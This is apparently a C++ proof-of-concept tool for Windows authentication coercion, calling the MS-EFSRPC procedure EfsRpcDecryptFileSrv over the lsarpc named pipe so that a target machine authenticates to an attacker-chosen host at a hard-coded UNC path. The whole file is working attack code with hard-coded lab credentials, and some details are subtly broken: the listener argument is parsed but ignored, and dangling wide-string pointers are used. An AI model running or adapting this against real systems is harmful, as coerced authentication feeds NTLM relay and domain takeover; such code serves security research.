#include <assert.h>
#include <stdio.h>
#include <tchar.h>
#include <SDKDDKVer.h>
#include <Windows.h>
// Headers generated by midl
#include "idl/ms-efsrpc_h.h"
#include "RpcUtils/Utils.hpp"
#include "ArgumentsParser/ArgumentsParser.h"

#pragma comment(lib, "rpcrt4.lib")


ArgumentsParser parseArgs(int argc, char* argv[]) {
	ArgumentsParser parser = ArgumentsParser();
	parser.add_string_argument("target", "-t", "--target", "", true, "IP or adress of the target machine");
	parser.add_string_argument("listener", "-l", "--listener", "", true, "Listener machine.");
	parser.add_boolean_switch_argument("verbose", "-v", "--verbose", false, false, "Verbose mode.");
	parser.parse_args(argc, argv);
	return parser;
}


handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAddress, wchar_t* target)
{
	wchar_t NetworkAddr[MAX_PATH];

	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t hBinding;

	unsigned long AuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
	unsigned long AuthnSvc = RPC_C_AUTHN_WINNT;
	unsigned long AuthzSvc = RPC_C_AUTHZ_NONE;

	// Auth Identity structure
	SEC_WINNT_AUTH_IDENTITY_A AuthIdentity;
	SecureZeroMemory(&AuthIdentity, sizeof(AuthIdentity));
	AuthIdentity.User = (unsigned char *)"poc";
	AuthIdentity.UserLength = strlen((char*)AuthIdentity.User);
	AuthIdentity.Domain = (unsigned char*)"LAB.local";
	AuthIdentity.DomainLength = strlen((char*)AuthIdentity.Domain);
	AuthIdentity.Password = (unsigned char*)"Admin123!";
	AuthIdentity.PasswordLength = strlen((char*)AuthIdentity.Password);
	AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

	swprintf(NetworkAddr, MAX_PATH, L"\\\\%s", target);

	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew
	RpcStatus = RpcStringBindingComposeW(InterfaceUUID, (RPC_WSTR)L"ncacn_np", (RPC_WSTR)NetworkAddr, InterfaceAddress, NULL, &StringBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[error] RpcStringBindingComposeW returned %d\n", RpcStatus);
		return (0);
	} else {
		printf("[debug] Created RPC StringBinding: %ls\n", (wchar_t*)StringBinding);
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingfromstringbindingw
	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[error] RpcBindingFromStringBindingW returned %d\n", RpcStatus);
		return (0);
	} else {
		printf("[debug] Successfully created binding from string.\n");
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringfreew
	RpcStatus = RpcStringFreeW(&StringBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[error] RpcStringFreeW returned %d\n", RpcStatus);
		return (0);
	} else {
		printf("[debug] Successfully freed RPC StringBinding.\n");
	}

	// http://msdn2.microsoft.com/en-us/library/ms682007.aspx
	if (AuthIdentity.UserLength == 0) {
		// Context with default Credentials
		printf("[debug] Using current user session credentials.\n");
		RpcStatus = RpcBindingSetAuthInfoW(hBinding, (RPC_WSTR)target, AuthnLevel, AuthnSvc, NULL, AuthzSvc);
	}
	else {
		// Context with supplied Credentials
		printf("[debug] Using user supplied credentials.\n");
		print_auth_identity(&AuthIdentity);
		RpcStatus = RpcBindingSetAuthInfoW(hBinding, (RPC_WSTR)target, AuthnLevel, AuthnSvc, (RPC_AUTH_IDENTITY_HANDLE)&AuthIdentity, AuthzSvc);
	}
	if (RpcStatus != RPC_S_OK) {
		printf("[error] RpcBindingSetAuthInfoW returned %d\n", RpcStatus);
		return (0);
	}
	else {
		printf("[debug] Authentication information successfully set.\n");
	}

	return hBinding;
}


void perform_call(
	const char * fname, const char * vulnparam_name, wchar_t * vulnparam_value,
	handle_t hBinding, wchar_t* FileName, unsigned long OpenFlag
) {
	HRESULT hr;
	printf("[debug] Calling %s(%s=\"%ls\").\n", fname, vulnparam_name, vulnparam_value);
	__try
	{
		hr = EfsRpcDecryptFileSrv(hBinding, FileName, OpenFlag);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		PrintWin32Error(GetExceptionCode());
		exit(0);
	}
	printf("[debug] %s returned 0x%08x.\n", fname, hr);
}


int main(int argc, char* argv[])
{
	const RPC_WSTR InterfaceUUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
	const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\lsarpc";
	const char* remote_procedure_name = "EfsRpcDecryptFileSrv";
	const char* vulnerable_parameter = "FileName";

	ArgumentsParser parser = parseArgs(argc, argv);
	bool verbose = std::get<bool>(parser.get_value("verbose"));
	std::string target = std::get<std::string>(parser.get_value("target"));
	wchar_t* target_w = (wchar_t*)std::wstring(target.begin(), target.end()).c_str();
	std::string listener = std::get<std::string>(parser.get_value("listener"));
	wchar_t* listener_w = (wchar_t*)std::wstring(listener.begin(), listener.end()).c_str();

	if (verbose) {
		std::cout << "[debug] Coercing " << target << " to authenticate to " << listener << " using remote procedure " << remote_procedure_name << "(...)\n";
	}


	handle_t hBinding = RpcBindHandle(InterfaceUUID, InterfaceAddress, target_w);

	// Preparing arguments
	wchar_t FileName[MAX_PATH];
	swprintf(FileName, MAX_PATH, L"\\\\%s\\share\\poc.txt", L"192.168.1.27");
	unsigned long OpenFlag = 0;
	// Performing the call
	perform_call(
		// Debug info
		remote_procedure_name, vulnerable_parameter, FileName,
		// RPC params
		hBinding, FileName, OpenFlag
	);

}
